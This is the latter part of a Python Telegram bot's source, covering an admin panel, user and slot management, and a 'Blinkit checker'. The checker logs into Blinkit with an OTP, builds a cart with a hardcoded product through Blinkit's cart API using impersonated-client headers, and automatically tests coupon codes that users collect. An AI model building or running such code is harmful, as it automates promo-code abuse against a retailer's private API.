# ═══════════════════════════════════════════════════════════════
# ADMIN
# ═══════════════════════════════════════════════════════════════

def admin_markup():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(btn("👥 ALL USERS", "admin_users", style="primary", icon=EMO_BLUE))
    kb.add(btn("🎁 TOP CODE HUNTERS", "admin_top", style="primary", icon=EMO_BLUE))
    kb.add(btn("👑 ADMIN ACCESS", "admin_access", style="success", icon=EMO_GREEN))
    kb.add(btn("🛒 BLINKIT CHECKER", "blinkit_menu", style="primary", icon=EMO_BLUE))
    kb.add(btn("🏠 HOME", "home", style="danger", icon=EMO_RED))
    return kb


def cb_admin_menu(chat_id, user_id):
    if not is_admin(user_id):
        BOT.send_message(chat_id, "❌ Admin only.", parse_mode="HTML")
        return
    users, panels, codes, today = db_stats()
    BOT.send_message(
        chat_id,
        f"🛠 <b>ADMIN PANEL</b>\n\n"
        f"👥 Total users: <b>{users}</b>\n"
        f"📂 Total panels: <b>{panels}</b>\n"
        f"🎁 Total codes: <b>{codes}</b>\n"
        f"📅 Codes (24h): <b>{today}</b>\n"
        f"🛒 Blinkit: {blinkit_status_line()}\n\n"
        f"Commands:\n"
        f"<code>/user &lt;id|@username&gt;</code> ➜ user stats (counts only)\n"
        f"<code>/give &lt;user_id&gt; &lt;slots&gt;</code> ➜ free slots do\n"
        f"<code>/addadmin &lt;user_id&gt;</code> ➜ kisi ko admin access do\n"
        f"<code>/blinkitlogin</code> ➜ Blinkit login (auto-check)\n"
        f"<code>/check CODE</code> ➜ manual check",
        parse_mode="HTML",
        reply_markup=admin_markup(),
    )


def cb_admin_users(chat_id, user_id):
    if not is_admin(user_id):
        return
    with _db_lock:
        con = _db()
        try:
            rows = con.execute(
                "SELECT u.user_id, u.username, u.first_name, u.total_codes, u.referrals_count, "
                "u.free_slots, (SELECT COUNT(*) FROM panels p WHERE p.user_id=u.user_id) as panels, u.created_at"
                " FROM users u ORDER BY u.created_at DESC LIMIT 25").fetchall()
        finally:
            con.close()
    msg = f"👥 <b>LATEST USERS ({len(rows)})</b>\n\n"
    for r in rows:
        uname = f"@{r[1]}" if r[1] else (r[2] or "?")
        msg += (f"• <b>{html.escape(uname)}</b> | ID <code>{r[0]}</code>\n"
                f"   📂{r[6]} | 🎁{r[3]} | 👥{r[4]} | ➕{r[5]}\n")
    msg += f"\nCounts hi dikhte hain — codes/panels sirf user ko."
    try:
        BOT.send_message(chat_id, msg[:4000], parse_mode="HTML")
    except Exception:
        pass
    BOT.send_message(chat_id, "🏠 Home?", parse_mode="HTML",
                     reply_markup=admin_markup())


def cb_admin_top(chat_id, user_id):
    if not is_admin(user_id):
        return
    rows = top_users(10)
    msg = f"🏆 <b>TOP CODE HUNTERS</b>\n\n"
    for i, r in enumerate(rows, 1):
        uname = f"@{r[1]}" if r[1] else (r[2] or f"ID {r[0]}")
        msg += (f"{i}. <b>{html.escape(uname)}</b>\n"
                f"   🎁 Codes: {r[3]} | 👥 Refer: {r[4]} | ➕ Free: {r[5]}\n")
    BOT.send_message(chat_id, msg, parse_mode="HTML",
                     reply_markup=admin_markup())


def cb_admin_codes(chat_id, user_id):
    if not is_admin(user_id):
        return
    BOT.send_message(chat_id, "🔒 <b>Codes private hain</b> — har user apne codes "
                              "sirf khud dekh sakta hai. Admin sirf counts dekhta hai "
                              "(/user).", parse_mode="HTML")


def cb_blinkit_menu(chat_id, user_id):
    if not is_admin(user_id):
        return
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(btn("🔑 BLINKIT LOGIN", "blinkit_login"))
    kb.add(btn("🏠 HOME", "home"))
    BOT.send_message(
        chat_id,
        f"🛒 <b>BLINKIT CHECKER</b>\n\n"
        f"🔐 Session: {blinkit_status_line()}\n\n"
        f"📊 Checked: <b>{BLINKIT_STATS['checked']}</b>\n"
        f"✅ Valid: <b>{BLINKIT_STATS['valid']}</b>\n"
        f"⚠️ Potential: <b>{BLINKIT_STATS['potential']}</b>\n"
        f"❌ Invalid: <b>{BLINKIT_STATS['invalid']}</b>\n"
        f"🔴 Errors: <b>{BLINKIT_STATS['errors']}</b>\n\n"
        f"Jaise hi kisi user ko code milega, yeh session use hokar "
        f"<b>auto-check</b> hoga. /check CODE se manual bhi check kar sakte ho.",
        parse_mode="HTML",
        reply_markup=kb,
    )


@BOT.message_handler(commands=["user"])
def admin_user(message):
    chat_id = message.chat.id
    if not is_admin(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) < 2:
        BOT.send_message(chat_id, "Usage: <code>/user &lt;id|@username&gt;</code>", parse_mode="HTML")
        return
    row = find_user(parts[1])
    if not row:
        BOT.send_message(chat_id, "❌ User nahi mila.", parse_mode="HTML")
        return
    uid = row[0]
    panels = get_user_panels(uid)
    with _db_lock:
        con = _db()
        try:
            codes_count = con.execute(
                "SELECT COUNT(*) FROM results WHERE user_id=? AND codes<>'[]'", (uid,)).fetchone()[0]
        finally:
            con.close()
    msg = (
        f"👤 <b>USER DETAILS</b>\n\n"
        f"🆔 ID: <code>{uid}</code>\n"
        f"👤 Name: <b>{html.escape(row[2] or '')}</b>\n"
        f"📛 @{row[1] or '-'}\n"
        f"🎫 Code: <code>{row[3]}</code>\n"
        f"👥 Referrals: {row[5]} | ➕ Free slots: {row[6]}\n"
        f"🎁 Codes found: <b>{codes_count}</b>\n"
        f"📂 Panels added: <b>{len(panels)}</b>\n\n"
        f"🔒 Codes aur panel URLs private hain — sirf user dekh sakta hai."
    )
    BOT.send_message(chat_id, msg, parse_mode="HTML",
                     reply_markup=admin_markup())


@BOT.message_handler(commands=["give"])
def admin_give(message):
    chat_id = message.chat.id
    if not is_admin(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) < 3 or not parts[1].isdigit() or not parts[2].isdigit():
        BOT.send_message(chat_id, "Usage: <code>/give &lt;user_id&gt; &lt;slots&gt;</code>", parse_mode="HTML")
        return
    uid, n = int(parts[1]), int(parts[2])
    if not get_user(uid):
        BOT.send_message(chat_id, "❌ User exist nahi karta.", parse_mode="HTML")
        return
    give_slots(uid, n)
    BOT.send_message(chat_id, f"✅ <b>{n} free slots</b> user <code>{uid}</code> ko de diye.",
                     parse_mode="HTML", reply_markup=admin_markup())
    try:
        BOT.send_message(uid, f"🎁 <b>+{n} FREE SLOTS!</b>\n\n"
                              f"Admin ne aapko {n} extra panel slots diye. 🎉\n"
                              f"Ab aur panels add karo!" + FOOTER, parse_mode="HTML")
    except Exception:
        pass


def cb_admin_access(chat_id, user_id):
    if not is_admin(user_id):
        return
    db_admins = list_admins()
    msg = f"👑 <b>ADMIN ACCESS</b>\n\n"
    msg += f"Yahan se kisi ko bhi <b>admin access</b> de sakte ho bot se hi:\n\n"
    msg += f"<code>/addadmin &lt;user_id&gt;</code> ➜ admin banao\n"
    msg += f"<code>/deladmin &lt;user_id&gt;</code> ➜ admin hatao\n\n"
    msg += f"👑 DB admins ({len(db_admins)}):\n"
    for a in db_admins[:20]:
        msg += f"  • <code>{a}</code>\n"
    if not db_admins:
        msg += "  (koi nahi)\n"
    msg += f"\n⚙️ Owner/ENV admins: {', '.join(str(a) for a in ADMIN_IDS)}"
    BOT.send_message(chat_id, msg, parse_mode="HTML",
                     reply_markup=admin_markup())


@BOT.message_handler(commands=["addadmin"])
def admin_add_admin(message):
    chat_id = message.chat.id
    if not is_admin(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) < 2 or not parts[1].lstrip("+-").isdigit():
        BOT.send_message(chat_id, "Usage: <code>/addadmin &lt;user_id&gt;</code>", parse_mode="HTML")
        return
    uid = int(parts[1])
    add_admin(uid, message.from_user.id)
    BOT.send_message(chat_id, f"✅ <b>Admin added:</b> <code>{uid}</code>\n"
                              f"Ab isko full access hai.", parse_mode="HTML",
                     reply_markup=admin_markup())
    try:
        BOT.send_message(uid, f"👑 <b>ADMIN ACCESS MILA!</b>\n\n"
                              f"Aapko bot ka <b>full admin access</b> de diya gaya hai. 🎉\n"
                              f"🛠 ADMIN PANEL ab aapko home menu me dikhega." + FOOTER,
                         parse_mode="HTML")
    except Exception:
        pass


@BOT.message_handler(commands=["deladmin"])
def admin_del_admin(message):
    chat_id = message.chat.id
    if not is_admin(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) < 2 or not parts[1].lstrip("+-").isdigit():
        BOT.send_message(chat_id, "Usage: <code>/deladmin &lt;user_id&gt;</code>", parse_mode="HTML")
        return
    uid = int(parts[1])
    if uid in ADMIN_IDS:
        BOT.send_message(chat_id, f"❌ <code>{uid}</code> owner/ENV admin hai — hata nahi sakte.",
                         parse_mode="HTML", reply_markup=admin_markup())
        return
    remove_admin(uid)
    BOT.send_message(chat_id, f"✅ <b>Admin removed:</b> <code>{uid}</code>", parse_mode="HTML",
                     reply_markup=admin_markup())


# ═══════════════════════════════════════════════════════════════
# BLINKIT LOGIN + MANUAL CHECK  (admin only)
# ═══════════════════════════════════════════════════════════════

_blinkit_login_state = {}


def blinkit_status_line():
    if not CFFI_OK:
        return "🔴 curl_cffi missing (pip install curl_cffi)"
    if blinkit_logged_in():
        s = _blinkit_session()
        return f"🟢 Logged in as <code>{s.get('phone', '?')}</code>"
    return "🔴 Not logged in - /blinkitlogin"


@BOT.message_handler(commands=["blinkitlogin"])
def admin_blinkit_login(message):
    if not is_admin(message.from_user.id):
        return
    _start_blinkit_login(message.chat.id)


def _start_blinkit_login(chat_id):
    if not CFFI_OK:
        BOT.send_message(chat_id, "❌ <b>curl_cffi</b> install nahi hai.\nRun: <code>pip install curl_cffi</code>",
                         parse_mode="HTML")
        return
    if blinkit_logged_in():
        s = _blinkit_session()
        BOT.send_message(
            chat_id,
            f"🟢 <b>Already logged in</b> as <code>{s.get('phone', '?')}</code>\n"
            f"Re-login karna hai to bhi apna 10-digit number bhejo:",
            parse_mode="HTML",
        )
    else:
        BOT.send_message(chat_id, "📱 Apna <b>10-digit Blinkit number</b> bhejo:", parse_mode="HTML")
    _blinkit_login_state[chat_id] = {"step": "phone"}
    BOT.register_next_step_handler_by_chat_id(chat_id, _blinkit_phone_step)


def _blinkit_phone_step(message):
    chat_id = message.chat.id
    if not is_admin(message.from_user.id):
        return
    phone = (message.text or "").strip()
    if len(phone) != 10 or not phone.isdigit():
        BOT.send_message(chat_id, "❌ Invalid number! 10 digit hona chahiye.")
        return
    BOT.send_message(chat_id, "⏳ Blinkit OTP bhej raha hu...")
    ok, msg = blinkit_request_otp(phone)
    if not ok:
        BOT.send_message(chat_id, f"❌ OTP fail: {msg}", parse_mode="HTML")
        _blinkit_login_state.pop(chat_id, None)
        return
    _blinkit_login_state[chat_id] = {"step": "otp", "phone": phone}
    BOT.send_message(chat_id, "📩 OTP bhej diya! Ab <b>OTP</b> bhejo:", parse_mode="HTML")
    BOT.register_next_step_handler_by_chat_id(chat_id, _blinkit_otp_step)


def _blinkit_otp_step(message):
    chat_id = message.chat.id
    if not is_admin(message.from_user.id):
        return
    state = _blinkit_login_state.get(chat_id, {})
    phone = state.get("phone")
    otp = (message.text or "").strip()
    if not phone:
        BOT.send_message(chat_id, "⚠️ Session expire. /blinkitlogin phir se.")
        return
    BOT.send_message(chat_id, "🔄 OTP verify ho raha hai...")
    token, msg = blinkit_verify_otp(phone, otp)
    if not token:
        BOT.send_message(chat_id, f"❌ OTP verify fail: {msg}", parse_mode="HTML")
        _blinkit_login_state.pop(chat_id, None)
        return
    BOT.send_message(chat_id, "✅ Login done! Cart setup ho raha hai...")
    cart_id, addr_id = blinkit_get_active_cart(token)
    if not (cart_id and addr_id):
        BOT.send_message(
            chat_id,
            "⚠️ Login ho gaya lekin <b>Cart setup fail</b>.\n"
            "Blinkit app mein ek item cart mein daalo, phir /blinkitlogin repeat karo.",
            parse_mode="HTML",
        )
        _blinkit_login_state.pop(chat_id, None)
        return
    session = {
        "access_token": token,
        "cart_id": cart_id,
        "channel_address_id": int(addr_id),
        "phone": phone,
        "base_payload": {
            "cart_type": "product",
            "channel_address_id": int(addr_id),
            "promo_codes": [],
            "items": [{
                "group_id": 1914948, "inventory": 15, "merchant_id": 36349,
                "merchant_type": "express", "mrp": 195.0, "price": 195.0,
                "product_id": "438914", "quantity": 1,
            }],
        },
    }
    _blinkit_save_session(session)
    try:
        _cffi_session.patch(f"{BLINKIT_BASE_URL}/v5/carts/{cart_id}",
                            json=session["base_payload"],
                            headers=_blinkit_headers(token, fixed_device=True), timeout=10)
    except Exception:
        pass
    _blinkit_login_state.pop(chat_id, None)
    BOT.send_message(
        chat_id,
        f"✅ <b>BLINKIT LOGIN SUCCESSFUL!</b>\n\n"
        f"📱 Phone: <code>{phone}</code>\n"
        f"🛒 Cart: Ready\n\n"
        f"Ab jaise hi koi user ko code milega, woh isi session se <b>auto-check</b> hoga "
        f"(✅ valid / ❌ invalid / ⚠️ potential) aur turant dikhega." + FOOTER,
        parse_mode="HTML",
    )


@BOT.message_handler(commands=["check"])
def admin_check(message):
    chat_id = message.chat.id
    if not is_admin(message.from_user.id):
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        BOT.send_message(chat_id, "Usage: <code>/check COUPONCODE</code>", parse_mode="HTML")
        return
    code = parts[1].strip().upper()
    if not blinkit_logged_in():
        BOT.send_message(chat_id, "❌ Pehle /blinkitlogin karo.", parse_mode="HTML")
        return
    m = BOT.send_message(chat_id, f"🔍 Checking <code>{code}</code>...", parse_mode="HTML")
    try:
        status, line = check_code_with_blinkit(code)
    except Exception as exc:
        status, line = "ERROR", str(exc)
    result = (f"🎟️ Code: <code>{html.escape(code)}</code>\n"
              f"🛒 Result: {line}\n"
              f"📊 Session total: {BLINKIT_STATS['checked']} checked | "
              f"✅ {BLINKIT_STATS['valid']} | ⚠️ {BLINKIT_STATS['potential']} | "
              f"❌ {BLINKIT_STATS['invalid']} | 🔴 {BLINKIT_STATS['errors']}")
    try:
        BOT.edit_message_text(result, chat_id=chat_id, message_id=m.message_id, parse_mode="HTML")
    except Exception:
        BOT.send_message(chat_id, result, parse_mode="HTML")


@BOT.message_handler(commands=["blinkit"])
def admin_blinkit_status(message):
    chat_id = message.chat.id
    if not is_admin(message.from_user.id):
        return
    BOT.send_message(
        chat_id,
        f"🛒 <b>BLINKIT CHECKER STATUS</b>\n\n"
        f"🔐 Session: {blinkit_status_line()}\n"
        f"📊 Checked: <b>{BLINKIT_STATS['checked']}</b>\n"
        f"✅ Valid: <b>{BLINKIT_STATS['valid']}</b>\n"
        f"⚠️ Potential: <b>{BLINKIT_STATS['potential']}</b>\n"
        f"❌ Invalid: <b>{BLINKIT_STATS['invalid']}</b>\n"
        f"🔴 Errors: <b>{BLINKIT_STATS['errors']}</b>\n\n"
        f"Commands:\n"
        f"<code>/blinkitlogin</code> - login\n"
        f"<code>/check CODE</code> - manual check\n"
        f"<code>/blinkit</code> - checker stats",
        parse_mode="HTML",
    )


@BOT.message_handler(commands=["codes"])
def admin_codes(message):
    chat_id = message.chat.id
    if not is_admin(message.from_user.id):
        return
    BOT.send_message(chat_id, "🔒 <b>Codes private hain</b> — har user apne codes "
                              "sirf khud dekh sakta hai. Admin sirf counts dekhta hai "
                              "(/user).", parse_mode="HTML")


# ═══════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════

def main():
    if not BOT_TOKEN:
        print("ERROR: BOT_TOKEN env var required")
        sys.exit(1)
    global BOT_USERNAME
    init_db()
    try:
        me = BOT.get_me()
        BOT_USERNAME = me.username
    except Exception:
        BOT_USERNAME = "autoblinkitbot"
    print(f"[ViedietBot] running | bot=@{BOT_USERNAME} | admins={ADMIN_IDS}")
    mirror = os.getenv("TELEGRAM_API", "").strip().rstrip("/")
    if mirror:
        apihelper.API_URL = mirror + "/bot{0}/{1}"
        print(f"[ViedietBot] telegram API mirror = {mirror}")
    poll_interval = 5
    while True:
        try:
            BOT.polling(
                non_stop=False,
                timeout=25,
                long_polling_timeout=20,
                skip_pending=True,
            )
            break
        except KeyboardInterrupt:
            print("\n[Bot] stopping...")
            break
        except telebot.apihelper.ApiTelegramException as exc:
            if exc.error_code == 409:
                print(f"[Bot] conflict: {exc} - retry {poll_interval}s")
            else:
                print(f"[Bot] Telegram API error {exc.error_code}: {exc} - retry {poll_interval}s")
        except Exception as exc:
            print(f"[Bot] polling error ({type(exc).__name__}: {exc}) - retry {poll_interval}s")
        time.sleep(poll_interval)
        poll_interval = min(poll_interval + 5, 60)


if __name__ == "__main__":
    main()
